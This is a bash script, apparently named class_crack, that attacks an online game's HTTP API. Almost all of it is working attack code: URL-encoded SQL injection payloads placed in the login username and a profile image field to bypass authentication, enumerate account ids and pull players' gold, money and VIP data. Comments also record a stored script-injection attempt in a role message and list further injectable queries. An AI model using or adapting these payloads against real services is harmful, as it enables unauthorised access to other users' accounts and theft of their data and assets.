#!/bin/bash

#depandency class_game_api

class_crack(){


	function getJqPath(){
		echo "lib/jq";
	}
	#set_name

	#edit_msg
	#UPDATE role SET name='<a>', msg='<script>alert('Q_Q')</sciprt>', img='default@p0000' WHERE id=35001___ 
	function update_table_role(){
		local api=set_name;
		local res;
		local err;

		#fake name
		local name='100';
		#fake msg <a><a/>
		local msg='%3Ca%3E%3Ca%2F%3E';

		#   id   %3D   ?   
		local condition=$1;
		local img='a%27+and+0%3D1+or+$condition+or+0%3D%271';

		res=$(callStandardApi $api $name $msg $img);
		err=$?

		echo $res;
		return $err;
	}

	#login
	#SELECT * FROM account WHERE account=''' AND password='405610beba2d4d7a190a9f8678018055' AND server='1'___
	function select_from_table_account_where(){
		local api=login;
		local res;
		local err;

		#   id   %3D   ?   
		local condition=$1;

		#a' and 0=1 or ????? or 0='1
		local username="a%27+and+0%3D1+or+$condition+or+0%3D%271";
		local password=password;

		res=$(callStandardApi $api $username $password);
		err=$?

		echo $res;
	}

	function crawl_id(){
		local jqPath=$(getJqPath);
		local condition=$1;

		res=$(select_from_table_account_where $condition);

		local id;
		local msg;
		local img;
		local mission;
		local role_name;

		result=$(echo $res|$jqPath "{id,msg,img,mission,role_name}");
		err=$?;
		if [ $err == 0 ];then
			echo $result;
		else
			echo $res;
		fi
		return $err;
		# , platfrom='funto' WHERE d=37721___9'1804e04'2cccd44f1'
	}

	function get_important_data_from_id(){
		local jqPath=$(getJqPath);
		local api=role_data;
		local err;

		local id=$1;

		local t_role;
		local lv;
		local gold;

		res=$(callStandardApi $api $id);
		err=$?;
		if [ $err != 0 ];then
			echo $res;
			return $err;
		fi

		t_role=$(echo $res|$jqPath ".t_role");
		err=$?;
		if [ $err != 0 ];then
			echo $t_role;
			return $err;
		fi

		important_data=$(echo $t_role|$jqPath "{d,id,vip,lv,gold,money}");
		err=$?;
		if [ $err == 0 ];then
			echo $important_data;
		else
			echo $t_role;
		fi
		return $err;
	}

	function login_and_get_important_data(){
		local jqPath=$(getJqPath);
		local api=login;
		local res;

		local username=$1;
		local password=$2;

		local id;

		res=$(callStandardApi "$api" "$username" "$password");
		id=$(echo $res|$jqPath ".id");
		id=${id:1:-1};

		local t_role;
		local user_id;
		local lv;
		local gold;

		res=$(get_important_data_from_id $id);

		echo $id;
		echo $username;
		echo $password;
		echo $res;
	}

	# other_role_data
	# SELECT * FROM role WHERE id=a___

	#attr=set_read&read=a&id=
	# UPDATE role_mail SET ReadState=1 WHERE (d=a AND to_id=13031)___

	
}



